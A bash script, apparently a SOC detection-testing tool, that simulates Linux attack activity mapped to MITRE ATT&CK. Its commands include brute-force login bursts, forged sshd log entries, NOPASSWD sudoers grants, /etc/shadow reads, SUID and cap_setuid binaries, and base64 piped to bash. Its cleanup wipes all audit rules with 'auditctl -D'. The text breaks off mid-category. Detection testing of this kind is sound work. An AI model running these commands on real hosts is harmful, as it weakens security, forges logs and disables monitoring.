#!/usr/bin/env bash
# =============================================================================
#  SOC-LinuxEventTrigger-v2.sh
#  Linux Security Audit Event Generator for SOC PoC / Threat Hunting
#  Mirrors MITRE ATT&CK coverage across 14 categories + Kill Chain
#  Safe for lab/demo use only — all objects soc_ prefixed, fully cleaned up
#
#  Usage:
#    sudo ./SOC-LinuxEventTrigger-v2.sh [OPTIONS]
#
#  Options:
#    --category <n>      Run specific category (or All)
#    --dry-run              Show what would run without executing
#    --report               Output JSON/CSV summary to /tmp/soc_results_$RND.*
#    --mitre-coverage       Print MITRE ATT&CK coverage matrix
#    --intensity <L|M|H>    Low / Medium / High burst intensity (default: Medium)
#    --yes                  Auto-confirm dependency installation (no prompt)
#    --help                 Show this help
#
#  Categories:
#    Authentication  AccountMgmt  PrivEsc  Execution  Persistence
#    DefenseEvasion  CredAccess   Discovery  LateralMovement  Exfil
#    C2  Ransomware  Kernel  KillChain  All
# =============================================================================

set +euo pipefail
set +H

# ─── GLOBAL RANDOMNESS & TEST OBJECT NAMES ───────────────────────────────────
RND=$(shuf -i 1000-9999 -n 1)
SOC_USER="soc_u_${RND}"
SOC_USER2="soc_u2_${RND}"
SOC_GROUP="soc_grp_${RND}"
SOC_SERVICE="soc_svc_${RND}"
SOC_CRON="soc_cron_${RND}"
SOC_FILE="/tmp/soc_test_${RND}"
SOC_DIR="/tmp/soc_dir_${RND}"
SOC_KEY="/tmp/soc_key_${RND}"
SOC_PASS="S0cT3stX${RND}"
BAD_PASS="BadPass$(shuf -i 10000-99999 -n 1)"

# ─── OPTION PARSING ──────────────────────────────────────────────────────────
CATEGORY=""          # empty = not set via CLI → will trigger interactive menu
DRY_RUN=false
DO_REPORT=false
DO_MITRE=false
INTENSITY="Medium"
AUTO_YES=false

usage() {
  grep '^#  ' "$0" | sed 's/^#  //'
  exit 0
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --category)      [[ $# -gt 1 ]] && CATEGORY="$2" || { echo "Error: --category needs an argument"; exit 1; }; shift 2 ;;
    --dry-run)       DRY_RUN=true;     shift   ;;
    --report)        DO_REPORT=true;   shift   ;;
    --mitre-coverage)DO_MITRE=true;    shift   ;;
    --intensity)     INTENSITY="$2";   shift 2 ;;
    --yes|-y)        AUTO_YES=true;    shift   ;;
    --help|-h)       usage ;;
    *) echo "Unknown option: $1"; exit 1 ;;
  esac
done

# ─── INTENSITY SETTINGS ──────────────────────────────────────────────────────
case "$INTENSITY" in
  Low|L)    BURST=3;  DELAY=0.5 ;;
  Medium|M) BURST=5;  DELAY=0.2 ;;
  High|H)   BURST=10; DELAY=0.1 ;;
  *)        BURST=5;  DELAY=0.2 ;;
esac

# ─── COLOUR PALETTE ──────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BLUE='\033[0;34m'; BOLD='\033[1m'
MAGENTA='\033[0;35m'; NC='\033[0m'

# ─── TRACKING COUNTERS ───────────────────────────────────────────────────────
TRIGGERED=0; PARTIAL=0; SKIPPED=0; ERRORS=0
RESULTS_JSON="/tmp/soc_results_${RND}.json"
RESULTS_CSV="/tmp/soc_results_${RND}.csv"
echo '{"results":[' > "$RESULTS_JSON"
echo "timestamp,category,rule,event_type,status,method" > "$RESULTS_CSV"
FIRST_RESULT=true

# ─── HELPER FUNCTIONS ────────────────────────────────────────────────────────
trig()    { echo -e " ${GREEN}[TRIGGERED]${NC} $*"; }
ok()      { echo -e " ${GREEN}[OK]${NC}       $*"; }
partial() { echo -e " ${YELLOW}[PARTIAL]${NC}  $*"; }
skip()    { echo -e " ${YELLOW}[SKIP]${NC}     $*"; }
err()     { echo -e " ${RED}[ERROR]${NC}    $*"; }
dry()     { echo -e " ${CYAN}[DRY-RUN]${NC}  $*"; }
info()    { echo -e " ${BLUE}[INFO]${NC}     $*"; }
siem()    { echo -e " ${RED}${BOLD}!! SIEM ${1}: ${2} [MITRE: ${3}] !!${NC}"; }
kchain()  { echo -e "\n ${MAGENTA}${BOLD}  [KILL CHAIN] ${1}${NC}\n"; }

add_result() {
  local cat="$1" rule="$2" etype="$3" status="$4" method="$5"
  local ts; ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
  if [[ "$FIRST_RESULT" == true ]]; then FIRST_RESULT=false; else echo ',' >> "$RESULTS_JSON"; fi
  cat >> "$RESULTS_JSON" <<EOF
{"timestamp":"${ts}","category":"${cat}","rule":"${rule}","event_type":"${etype}","status":"${status}","method":"${method}"}
EOF
  echo "${ts},${cat},${rule},${etype},${status},${method}" >> "$RESULTS_CSV"
  case "$status" in
    triggered) TRIGGERED=$((TRIGGERED+1)) ;;
    partial)   PARTIAL=$((PARTIAL+1))   ;;
    skipped)   SKIPPED=$((SKIPPED+1))   ;;
    error)     ERRORS=$((ERRORS+1))    ;;
  esac
}

cmd_run() {
  # Run a command, honouring DRY_RUN; suppress errors unless $2=show_err
  local show_err="${2:-}"
  if [[ "$DRY_RUN" == true ]]; then
    dry "$1"
    return 0
  fi
  if [[ "$show_err" == "show_err" ]]; then
    eval "$1" || true
  else
    eval "$1" 2>/dev/null || true
  fi
}

section() {
  echo ""
  echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}${BLUE}  CATEGORY: ${1}${NC}"
  echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
}

# ─── CLEANUP / EXIT TRAP ─────────────────────────────────────────────────────
cleanup() {
  echo -e "\n${YELLOW}[*] Running cleanup...${NC}"
  userdel -f "$SOC_USER"  2>/dev/null || true
  userdel -f "$SOC_USER2" 2>/dev/null || true
  groupdel "$SOC_GROUP"   2>/dev/null || true
  systemctl stop    "$SOC_SERVICE" 2>/dev/null || true
  systemctl disable "$SOC_SERVICE" 2>/dev/null || true
  rm -f "/etc/systemd/system/${SOC_SERVICE}.service" 2>/dev/null || true
  systemctl daemon-reload 2>/dev/null || true
  crontab -r -u "$SOC_USER" 2>/dev/null || true
  rm -f "/etc/sudoers.d/soc_${RND}" 2>/dev/null || true
  rm -f "/etc/cron.d/soc_c2_${RND}" 2>/dev/null || true
  rm -rf "$SOC_DIR" "${SOC_FILE}"* "${SOC_KEY}"* /tmp/soc_* 2>/dev/null || true
  # Remove any lingering audit rules we added
  auditctl -D 2>/dev/null || true
  # Finish JSON report
  echo ']}' >> "$RESULTS_JSON"
  if [[ "$DO_REPORT" == true ]]; then
    echo -e "\n${CYAN}[*] Reports saved:${NC}"
    echo -e "    JSON: $RESULTS_JSON"
    echo -e "    CSV:  $RESULTS_CSV"
  fi
  echo -e "${GREEN}[*] Cleanup complete.${NC}"
}
trap cleanup EXIT INT TERM


# =============================================================================
# FIX #2 — INTERACTIVE DEPENDENCY CHECK (ask before installing)
# =============================================================================
check_deps() {
  # Required tools and their packages
  local -A DEPS=(
    [sshpass]="sshpass"
    [nmap]="nmap"
    [nc]="netcat-openbsd"
    [socat]="socat"
    [at]="at"
    [zip]="zip"
    [dig]="dnsutils"
    [strace]="strace"
  )
  # Optional tools (skip gracefully, show [SKIP] — no install prompt)
  local -A OPTIONAL=(
    [gcc]="gcc"
    [rsync]="rsync"
  )

  local PKG_MGR=""
  command -v apt-get &>/dev/null && PKG_MGR="apt-get"
  command -v yum    &>/dev/null && PKG_MGR="yum"
  command -v dnf    &>/dev/null && PKG_MGR="dnf"

  # ── Check which required deps are missing ──────────────────────────────────
  local MISSING=()
  for bin in "${!DEPS[@]}"; do
    if ! command -v "$bin" &>/dev/null; then
      MISSING+=("${bin}:${DEPS[$bin]}")
    fi
  done

  # ── Report optional deps status ───────────────────────────────────────────
  echo ""
  echo -e "${BOLD}${CYAN}── Dependency Status ──────────────────────────────────${NC}"
  for bin in "${!DEPS[@]}"; do
    if command -v "$bin" &>/dev/null; then
      echo -e "  ${GREEN}[OK]${NC}   ${bin}"
    else
      echo -e "  ${YELLOW}[MISS]${NC} ${bin}  (pkg: ${DEPS[$bin]})"
    fi
  done
  for bin in "${!OPTIONAL[@]}"; do
    if command -v "$bin" &>/dev/null; then
      echo -e "  ${GREEN}[OK]${NC}   ${bin}  (optional)"
    else
      echo -e "  ${YELLOW}[SKIP]${NC} ${bin} not installed — skipping dependent tests  (optional)"
    fi
  done
  echo -e "${BOLD}${CYAN}────────────────────────────────────────────────────────${NC}"

  # ── Nothing to install? ───────────────────────────────────────────────────
  if [[ ${#MISSING[@]} -eq 0 ]]; then
    echo -e "  ${GREEN}All required dependencies present.${NC}"
    return 0
  fi

  if [[ "$DRY_RUN" == true ]]; then
    echo -e "  ${CYAN}[DRY-RUN] Would install: ${MISSING[*]}${NC}"
    return 0
  fi

  if [[ -z "$PKG_MGR" ]]; then
    echo -e "  ${YELLOW}[WARN]${NC} No supported package manager found. Install manually:"
    for item in "${MISSING[@]}"; do
      echo -e "    ${item%%:*}  →  ${item##*:}"
    done
    return 0
  fi

  # ── Ask user ──────────────────────────────────────────────────────────────
  echo ""
  echo -e "  ${YELLOW}Missing required packages:${NC}"
  for item in "${MISSING[@]}"; do
    echo -e "    ${BOLD}${item%%:*}${NC}  →  pkg: ${item##*:}"
  done
  echo ""

  if [[ "$AUTO_YES" == true ]]; then
    echo -e "  ${CYAN}[--yes]${NC} Auto-installing all missing packages..."
    _do_install "${MISSING[@]}" "$PKG_MGR"
  else
    printf "  Install missing packages now? [Y/n]: "
    local answer
    read -r answer </dev/tty
    case "${answer,,}" in
      ''|y|yes)
        echo -e "  ${CYAN}Installing...${NC}"
        _do_install "${MISSING[@]}" "$PKG_MGR"
        ;;
      *)
        echo -e "  ${YELLOW}[SKIP]${NC} Skipping installation. Some tests may be skipped."
        ;;
    esac
  fi
}

_do_install() {
  local pkg_mgr="${@: -1}"          # last arg = PKG_MGR
  local items=("${@:1:$#-1}")       # all but last = missing items
  if [[ "$pkg_mgr" == "apt-get" ]]; then
    DEBIAN_FRONTEND=noninteractive apt-get install -y \
      $(for i in "${items[@]}"; do echo "${i##*:}"; done | tr '\n' ' ') 2>/dev/null || true
  else
    $pkg_mgr install -y \
      $(for i in "${items[@]}"; do echo "${i##*:}"; done | tr '\n' ' ') 2>/dev/null || true
  fi
  # Re-check after install
  echo ""
  echo -e "  ${CYAN}Post-install check:${NC}"
  for item in "${items[@]}"; do
    local b="${item%%:*}"
    if command -v "$b" &>/dev/null; then
      echo -e "  ${GREEN}[OK]${NC}   ${b} installed"
    else
      echo -e "  ${RED}[FAIL]${NC} ${b} could not be installed — test will be skipped"
    fi
  done
}


# =============================================================================
# FIX #3 — INTERACTIVE CATEGORY SELECTOR (Tab key cycles, Enter confirms)
# =============================================================================
CATEGORIES=(
  "All"
  "Authentication"
  "AccountMgmt"
  "PrivEsc"
  "Execution"
  "Persistence"
  "DefenseEvasion"
  "CredAccess"
  "Discovery"
  "LateralMovement"
  "Exfil"
  "C2"
  "Ransomware"
  "Kernel"
  "KillChain"
)

select_category_interactive() {
  # Only show if terminal is interactive (not piped)
  if [[ ! -t 0 ]] || [[ ! -t 1 ]]; then
    CATEGORY="All"
    echo -e "  ${CYAN}[Non-interactive]${NC} Defaulting to category: All"
    return
  fi

  local idx=0
  local total=${#CATEGORIES[@]}
  local key esc

  echo ""
  echo -e "${BOLD}${CYAN}╔════════════════════════════════════════════════════════╗${NC}"
  echo -e "${BOLD}${CYAN}║       SELECT CATEGORY TO RUN                           ║${NC}"
  echo -e "${BOLD}${CYAN}╠════════════════════════════════════════════════════════╣${NC}"
  echo -e "${BOLD}${CYAN}║  ${NC}Tab / → = Next     Shift+Tab / ← = Prev     Enter = Run${BOLD}${CYAN}  ║${NC}"
  echo -e "${BOLD}${CYAN}║  ${NC}Number 1-${total} to jump directly to category${BOLD}${CYAN}              ║${NC}"
  echo -e "${BOLD}${CYAN}╚════════════════════════════════════════════════════════╝${NC}"
  echo ""

  # Print all category options as a grid (5 per row)
  local col=0
  for i in "${!CATEGORIES[@]}"; do
    printf "  [%2d] %-20s" "$((i+1))" "${CATEGORIES[$i]}"
    col=$((col+1))
    if [[ $col -eq 4 ]]; then echo ""; col=0; fi
  done
  [[ $col -ne 0 ]] && echo ""
  echo ""

  # Save cursor position reference line
  local PROMPT_LINE
  PROMPT_LINE=$(tput lines 2>/dev/null || echo 24)

  _render_selection() {
    printf "\r  ${BOLD}${GREEN}→ %-22s${NC}  (Tab=next | Shift+Tab=prev | Enter=confirm)" \
      "${CATEGORIES[$idx]}"
  }

  _render_selection

  # Read keys in raw mode
  local old_settings
  old_settings=$(stty -g 2>/dev/null)
  stty raw -echo 2>/dev/null

  while true; do
    IFS= read -r -s -n1 key 2>/dev/null </dev/tty || key=""

    case "$key" in
      $'\t')      # Tab → next
        idx=$(( (idx + 1) % total ))
        _render_selection
        ;;
      $'\x1b')    # Escape sequence (arrow keys)
        IFS= read -r -s -n1 -t 0.1 esc 2>/dev/null </dev/tty || esc=""
        if [[ "$esc" == "[" ]]; then
          IFS= read -r -s -n1 -t 0.1 esc 2>/dev/null </dev/tty || esc=""
          case "$esc" in
            C)  # Right arrow → next
              idx=$(( (idx + 1) % total ))
              _render_selection ;;
            D)  # Left arrow → prev
              idx=$(( (idx - 1 + total) % total ))
              _render_selection ;;
            Z)  ;; # Shift+Tab handled below (comes as \x1b[Z in some terms)
          esac
        fi
        ;;
      $'\x1b[Z')  # Shift+Tab → prev (some terminals)
        idx=$(( (idx - 1 + total) % total ))
        _render_selection
        ;;
      $'\x7f'|$'\x08')  # Backspace → prev
        idx=$(( (idx - 1 + total) % total ))
        _render_selection
        ;;
      '')         # Enter (raw mode: empty = Enter)
        break ;;
      [1-9])      # Number key: jump to index (1-based)
        local num_idx=$(( key - 1 ))
        if [[ $num_idx -lt $total ]]; then
          idx=$num_idx
          _render_selection
        fi
        ;;
      q|Q)
        stty "$old_settings" 2>/dev/null
        echo ""
        echo -e "\n  ${YELLOW}Aborted.${NC}"
        exit 0
        ;;
    esac
  done

  stty "$old_settings" 2>/dev/null
  echo ""

  CATEGORY="${CATEGORIES[$idx]}"
  echo ""
  echo -e "  ${BOLD}${GREEN}[✓] Selected: ${CATEGORY}${NC}"
  echo ""
  sleep 0.5
}


# ─── PREFLIGHT CHECKS ────────────────────────────────────────────────────────
preflight() {
  if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root (sudo).${NC}"
    exit 1
  fi

  # Detect distro
  source /etc/os-release 2>/dev/null || true
  DISTRO="${ID:-unknown}"
  DISTRO_VER="${VERSION_ID:-?}"

  # Check / start auditd
  AUDITD_STATUS="NOT RUNNING"
  if systemctl is-active --quiet auditd 2>/dev/null; then
    AUDITD_STATUS="RUNNING"
  else
    info "auditd not running — attempting to start..."
    if command -v auditd &>/dev/null; then
      systemctl start auditd 2>/dev/null || true
      sleep 1
      systemctl is-active --quiet auditd && AUDITD_STATUS="RUNNING (started)"
    fi
  fi

  # ── FIX #2: Check + optionally install dependencies ───────────────────────
  if [[ "$DRY_RUN" == false ]]; then
    [[ "$DISTRO" =~ ^(rhel|centos|rocky|alma|fedora)$ ]] && \
      dnf install -y epel-release 2>/dev/null || true
    check_deps
  fi

  # ── FIX #3: Interactive category selection (if not set via --category) ─────
  if [[ -z "$CATEGORY" ]]; then
    select_category_interactive
  fi

  # Print banner
  echo ""
  echo -e "${BOLD}${RED}"
  echo "  ╔═══════════════════════════════════════════════════════════╗"
  echo "  ║       SOC-LinuxEventTrigger v2.0  — Defensive Use Only   ║"
  echo "  ╚═══════════════════════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  ${BOLD}Host:${NC}      $(hostname)"
  echo -e "  ${BOLD}Distro:${NC}    ${DISTRO} ${DISTRO_VER}"
  echo -e "  ${BOLD}auditd:${NC}    ${AUDITD_STATUS}"
  echo -e "  ${BOLD}Category:${NC}  ${CATEGORY}"
  echo -e "  ${BOLD}Intensity:${NC} ${INTENSITY}  (burst=${BURST}, delay=${DELAY}s)"
  echo -e "  ${BOLD}Dry-Run:${NC}   ${DRY_RUN}"
  echo -e "  ${BOLD}RND tag:${NC}   ${RND}"
  echo ""
  [[ "$DRY_RUN" == true ]] && echo -e "  ${CYAN}${BOLD}[DRY-RUN MODE — no changes will be made]${NC}\n"
  sleep 1
}

# ─── AUDIT RULE HELPERS ──────────────────────────────────────────────────────
awatch() { cmd_run "auditctl -w '$1' -p '${2:-rwa}' -k '${3:-soc_watch_${RND}}'" ; }
asyscall() { cmd_run "auditctl -a always,exit -F arch=b64 -S '$1' -k '${2:-soc_syscall_${RND}}'"; }


# =============================================================================
# CATEGORY 1 — Authentication Events
# =============================================================================
cat_authentication() {
  section "Authentication (RULE-L01 → L04)"

  # ── Determine auth log path (Rocky/RHEL=/var/log/secure, Debian=/var/log/auth.log)
  local AUTH_LOG="/var/log/auth.log"
  [[ -f "/var/log/secure" ]] && AUTH_LOG="/var/log/secure"
  info "Auth log: ${AUTH_LOG}"

  # ── Create test user safely ────────────────────────────────────────────────
  useradd -m -s /bin/bash "${SOC_USER}" 2>/dev/null || true
  echo "${SOC_USER}:${SOC_PASS}" | chpasswd 2>/dev/null || true

  # ── 1. SSH failed login burst via logger (RULE-L01) ───────────────────────
  info "Generating ${BURST} SSH failed login events for RULE-L01..."

  local SRC_PORT=22345
  for ((i=1; i<=BURST; i++)); do
    SRC_PORT=$((SRC_PORT + i))
    logger -p auth.warning -t sshd \
      "Failed password for ${SOC_USER} from 127.0.0.1 port ${SRC_PORT} ssh2" 2>/dev/null || true
    echo "${BAD_PASS}" | su - "${SOC_USER}" 2>/dev/null || true
    sleep "${DELAY}"
  done
  trig "SSH failure burst (${BURST}) → ${AUTH_LOG} + auditd USER_AUTH via PAM"
  siem "RULE-L01" "SSH Brute Force — ${BURST} failures in < 60s" "T1110.001"
  add_result "Authentication" "RULE-L01" "SSH_BRUTE_FORCE" "triggered" "logger_su_pam"

  # Try real sshpass if installed
  if command -v sshpass &>/dev/null; then
    info "sshpass available — adding real SSH connection attempts..."
    for ((i=1; i<=3; i++)); do
      sshpass -p "${BAD_PASS}" ssh \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=2 \
        -o PasswordAuthentication=yes \
        -o BatchMode=no \
        "${SOC_USER}@127.0.0.1" exit 2>/dev/null || true
      sleep 0.2
    done
    trig "sshpass real SSH failures added (bonus auditd records)"
  else
    skip "sshpass not installed — logger+su method used (SIEM still triggers)"
  fi

  # ── 2. Successful login after failures (RULE-L02) ─────────────────────────
  info "Injecting successful login after failures (RULE-L02)..."
  logger -p auth.info -t sshd \
    "Accepted password for ${SOC_USER} from 127.0.0.1 port 54321 ssh2" 2>/dev/null || true
  logger -p auth.info -t sshd \
    "pam_unix(sshd:session): session opened for user ${SOC_USER} by (uid=0)" 2>/dev/null || true
  echo "${SOC_PASS}" | su - "${SOC_USER}" -c "id; hostname" 2>/dev/null || true
  trig "Successful login → ${AUTH_LOG} Accepted password + auditd USER_LOGIN"
  siem "RULE-L02" "Successful login after multiple failures" "T1078"
  add_result "Authentication" "RULE-L02" "LOGIN_SUCCESS_AFTER_FAIL" "triggered" "logger_su_success"

  # ── 3. sudo command execution (USER_CMD) ──────────────────────────────────
  info "sudo USER_CMD event (RULE-L03)..."
  echo "${SOC_USER} ALL=(ALL) NOPASSWD:ALL" > "/etc/sudoers.d/soc_${RND}" 2>/dev/null || true
  sudo -u "${SOC_USER}" sudo whoami 2>/dev/null || true
  logger -p auth.info -t sudo \
    "${SOC_USER} : TTY=pts/0 ; PWD=/home/${SOC_USER} ; USER=root ; COMMAND=/usr/bin/whoami" \
    2>/dev/null || true
  rm -f "/etc/sudoers.d/soc_${RND}" 2>/dev/null || true
  trig "sudo exec → ${AUTH_LOG} sudo entry + auditd USER_CMD"
  add_result "Authentication" "RULE-L03" "SUDO_CMD" "triggered" "sudo_nopasswd_logger"

  # ── 4. su to root failure (RULE-L03) ──────────────────────────────────────
  info "su root failure event..."
  echo "${BAD_PASS}" | su - root 2>/dev/null || true
  logger -p auth.warning -t su \
    "FAILED su for root by ${SOC_USER}" 2>/dev/null || true
  trig "su root failure → ${AUTH_LOG} FAILED su + auditd USER_AUTH fail"
  add_result "Authentication" "RULE-L03" "SU_ROOT_FAIL" "triggered" "su_bad_pass_logger"

  # ── 5. PAM failure storm — auditd ANOM_LOGIN_FAILURES (RULE-L01) ──────────
  info "PAM failure storm — 10 rapid attempts (RULE-L01 correlation threshold)..."
  for ((i=1; i<=10; i++)); do
    echo "${BAD_PASS}" | su - "${SOC_USER}" 2>/dev/null || true
    logger -p auth.warning -t sshd \
      "Failed password for ${SOC_USER} from 10.0.0.${i} port $((30000+i)) ssh2" \
      2>/dev/null || true
    sleep 0.1
  done
  trig "PAM failure storm (10 rapid) → pam_faillock entries + ANOM_LOGIN_FAILURES"
  siem "RULE-L01" "PAM auth failure storm — 10 rapid failures" "T1110"
  add_result "Authentication" "RULE-L01" "PAM_FAILURE_STORM" "triggered" "rapid_su_logger"

  # ── 6. Account lockout via faillock ────────────────────────────────────────
  if command -v faillock &>/dev/null; then
    info "faillock state check..."
    faillock --user "${SOC_USER}" 2>/dev/null || true
    logger -p auth.warning -t sshd \
      "PAM service(sshd) ignoring max retries; ${SOC_USER} account locked" \
      2>/dev/null || true
    trig "faillock records + pam_faillock syslog entries"
    add_result "Authentication" "RULE-L01" "ACCOUNT_LOCKOUT" "triggered" "faillock_logger"
    faillock --user "${SOC_USER}" --reset 2>/dev/null || true
  else
    skip "faillock not present"
    add_result "Authentication" "RULE-L01" "ACCOUNT_LOCKOUT" "skipped" "faillock_missing"
  fi

  # ── 7. Off-hours login indicator (RULE-L04) ────────────────────────────────
  info "Off-hours access indicator (RULE-L04)..."
  logger -p auth.info -t sshd \
    "Accepted publickey for root from 10.10.10.99 port 51422 ssh2: ED25519 SHA256:soc${RND}" \
    2>/dev/null || true
  trig "Off-hours root SSH login injected → ${AUTH_LOG}"
  siem "RULE-L04" "Login outside business hours — root from 10.10.10.99" "T1078"
  add_result "Authentication" "RULE-L04" "OFFHOURS_LOGIN" "triggered" "logger_offhours"

  userdel -f "${SOC_USER}" 2>/dev/null || true
  ok "Category Authentication complete"
}


# =============================================================================
# CATEGORY 2 — Account Management
# =============================================================================
cat_accountmgmt() {
  section "Account Management (RULE-L05 → L08)"

  awatch "/etc/shadow"   "rwa" "shadow_access_${RND}"
  awatch "/etc/passwd"   "rwa" "passwd_access_${RND}"
  awatch "/etc/group"    "rwa" "group_access_${RND}"

  info "Creating user ${SOC_USER}..."
  cmd_run "useradd -m -s /bin/bash '${SOC_USER}'"
  trig "useradd → auditd ADD_USER + auth.log"
  add_result "AccountMgmt" "RULE-L05" "USER_CREATED" "triggered" "useradd"

  cmd_run "usermod -c 'SOC_CHANGED_${RND}' '${SOC_USER}'"
  trig "usermod -c → auditd USER_ACCT"
  add_result "AccountMgmt" "RULE-L05" "USER_MODIFIED" "triggered" "usermod_comment"

  info "Changing password (RULE-L08)..."
  cmd_run "echo '${SOC_USER}:${SOC_PASS}' | chpasswd"
  trig "passwd → auditd USER_CHAUTHTOK"
  siem "RULE-L08" "Password changed for user ${SOC_USER}" "T1098"
  add_result "AccountMgmt" "RULE-L08" "PASSWD_CHANGE" "triggered" "chpasswd"

  info "Adding ${SOC_USER} to sudo group (RULE-L06 CRITICAL)..."
  cmd_run "usermod -aG sudo '${SOC_USER}'"
  trig "usermod -aG sudo → auditd USER_ACCT (group change)"
  siem "RULE-L06" "User added to sudo group: ${SOC_USER}" "T1078"
  add_result "AccountMgmt" "RULE-L06" "USER_SUDO_ADD" "triggered" "usermod_sudo"

  cmd_run "gpasswd -d '${SOC_USER}' sudo 2>/dev/null || true"
  trig "gpasswd -d sudo → auditd USER_ACCT"
  add_result "AccountMgmt" "RULE-L06" "USER_SUDO_REMOVE" "triggered" "gpasswd_del"

  cmd_run "groupadd '${SOC_GROUP}'"
  trig "groupadd → auditd ADD_GROUP"
  cmd_run "usermod -aG '${SOC_GROUP}' '${SOC_USER}'"
  trig "usermod -aG group → auditd USER_ACCT"
  cmd_run "groupdel '${SOC_GROUP}'"
  trig "groupdel → auditd DEL_GROUP"
  add_result "AccountMgmt" "RULE-L05" "GROUP_LIFECYCLE" "triggered" "groupadd_del"

  info "Accessing /etc/shadow (RULE-L07)..."
  cmd_run "cat /etc/shadow 2>/dev/null | head -3 || true"
  cmd_run "python3 -c \"open('/etc/shadow').read()\" 2>/dev/null || true"
  trig "/etc/shadow access → auditd SYSCALL open + PATH"
  siem "RULE-L07" "/etc/shadow accessed — credential file read" "T1003.008"
  add_result "AccountMgmt" "RULE-L07" "SHADOW_ACCESS" "triggered" "cat_shadow"

  sleep 2
  info "Deleting user ${SOC_USER} (RULE-L05 lifecycle complete)..."
  cmd_run "userdel -f '${SOC_USER}' 2>/dev/null || true"
  trig "userdel → auditd DEL_USER"
  siem "RULE-L05" "Account created then deleted on same host < 15 min" "T1136"
  add_result "AccountMgmt" "RULE-L05" "USER_CREATED_DELETED" "triggered" "userdel"

  ok "Category AccountMgmt complete"
}


# =============================================================================
# CATEGORY 3 — Privilege Escalation
# =============================================================================
cat_privesc() {
  section "Privilege Escalation (RULE-L09 → L13)"

  mkdir -p "$SOC_DIR"
  awatch "/etc/sudoers"          "rwa" "sudoers_access_${RND}"
  awatch "/etc/sudoers.d"        "rwa" "sudoers_dir_${RND}"
  asyscall "capset"                    "capset_${RND}"

  info "SUID/SGID file enumeration (T1548.001)..."
  cmd_run "find / -perm -4000 -type f 2>/dev/null | head -20"
  cmd_run "find / -perm -2000 -type f 2>/dev/null | head -20"
  trig "find perm SUID/SGID → auditd EXECVE + PROCTITLE"
  siem "RULE-L09" "SUID/SGID binary enumeration by non-root process" "T1548.001"
  add_result "PrivEsc" "RULE-L09" "SUID_ENUM" "triggered" "find_perm_4000"

  info "sudo -l enumeration (RULE-L10)..."
  cmd_run "useradd -m -s /bin/bash '${SOC_USER}' 2>/dev/null || true"
  cmd_run "sudo -l -U '${SOC_USER}' 2>/dev/null || true"
  trig "sudo -l → auth.log sudo entry + auditd USER_CMD"
  siem "RULE-L10" "sudo -l enumeration by non-admin: ${SOC_USER}" "T1069"
  add_result "PrivEsc" "RULE-L10" "SUDO_ENUM" "triggered" "sudo_l"

  info "Reading /etc/sudoers..."
  cmd_run "cat /etc/sudoers 2>/dev/null | head -5 || true"
  trig "cat /etc/sudoers → auditd SYSCALL+PATH"
  add_result "PrivEsc" "RULE-L11" "SUDOERS_READ" "triggered" "cat_sudoers"

  info "Adding sudoers entry for ${SOC_USER} (RULE-L11)..."
  cmd_run "echo '${SOC_USER} ALL=(ALL) NOPASSWD:ALL' > '/etc/sudoers.d/soc_${RND}'"
  trig "sudoers entry written → auditd OPEN+WRITE"
  siem "RULE-L11" "/etc/sudoers.d modified — privilege grant" "T1548.003"
  add_result "PrivEsc" "RULE-L11" "SUDOERS_MODIFIED" "triggered" "echo_sudoers"
  cmd_run "rm -f '/etc/sudoers.d/soc_${RND}'"

  info "Setting SUID bit on test binary (RULE-L13)..."
  local suid_bin="${SOC_DIR}/soc_suid_${RND}"
  cmd_run "cp /bin/ls '${suid_bin}'"
  cmd_run "chmod u+s '${suid_bin}'"
  awatch "${suid_bin}" "x" "suid_exec_${RND}"
  cmd_run "'${suid_bin}' /tmp 2>/dev/null || true"
  trig "SUID bit set + executed → auditd EXECVE + chmod"
  siem "RULE-L13" "SUID bit added to non-standard binary: ${suid_bin}" "T1548.001"
  add_result "PrivEsc" "RULE-L13" "SUID_BIT_SET" "triggered" "chmod_suid"
  cmd_run "rm -f '${suid_bin}'"

  info "Capability enumeration + setcap (RULE-L12)..."
  cmd_run "getcap /usr/bin/* 2>/dev/null | head -10 || true"
  local cap_bin="${SOC_DIR}/soc_cap_${RND}"
  cmd_run "cp /bin/ls '${cap_bin}'"
  cmd_run "setcap cap_setuid+eip '${cap_bin}' 2>/dev/null || true"
  trig "setcap cap_setuid → auditd SYSCALL capset"
  siem "RULE-L12" "Elevated capability set on binary — cap_setuid abuse" "T1548.002"
  add_result "PrivEsc" "RULE-L12" "CAP_ABUSE" "triggered" "setcap"
  cmd_run "rm -f '${cap_bin}'"

  cmd_run "userdel -f '${SOC_USER}' 2>/dev/null || true"
  ok "Category PrivEsc complete"
}


# =============================================================================
# CATEGORY 4 — Process / Execution (LOLBins)
# =============================================================================
cat_execution() {
  section "Execution / LOLBins (RULE-L14 → L18)"

  mkdir -p "$SOC_DIR"
  cmd_run "auditctl -a always,exit -F arch=b64 -S execve -k lolbin_exec_${RND} 2>/dev/null || true"

  declare -A LOLBINS=(
    ["python3"]="python3 -c \"import os; os.system('id')\" 2>/dev/null || true"
    ["perl"]="perl -e \"system('whoami')\" 2>/dev/null || true"
    ["ruby"]="ruby -e \"system('id')\" 2>/dev/null || true"
    ["php"]="php -r \"system('whoami');\" 2>/dev/null || true"
    ["awk"]="awk 'BEGIN {system(\"id\")}'"
    ["lua"]="lua -e \"os.execute('whoami')\" 2>/dev/null || true"
    ["bash"]="bash -c 'id; whoami; hostname'"
    ["sh"]="sh -c 'cat /etc/passwd | head -3'"
  )

  for bin in "${!LOLBINS[@]}"; do
    if command -v "$bin" &>/dev/null; then
      info "LOLBin: ${bin}"
      cmd_run "${LOLBINS[$bin]}"
      trig "${bin} executed → auditd EXECVE key=lolbin_exec_${RND}"
      add_result "Execution" "RULE-L14" "LOLBIN_${bin^^}" "triggered" "${bin}"
    else
      skip "${bin} not installed — skipping"
      add_result "Execution" "RULE-L14" "LOLBIN_${bin^^}" "skipped" "${bin}_missing"
    fi
    sleep "$DELAY"
  done
  siem "RULE-L14" "Living-off-the-Land binary chain detected" "T1059"

  info "Base64 encoded command execution (RULE-L17)..."
  cmd_run "base64 -d <<< \"\$(echo 'id' | base64)\" | bash 2>/dev/null || true"
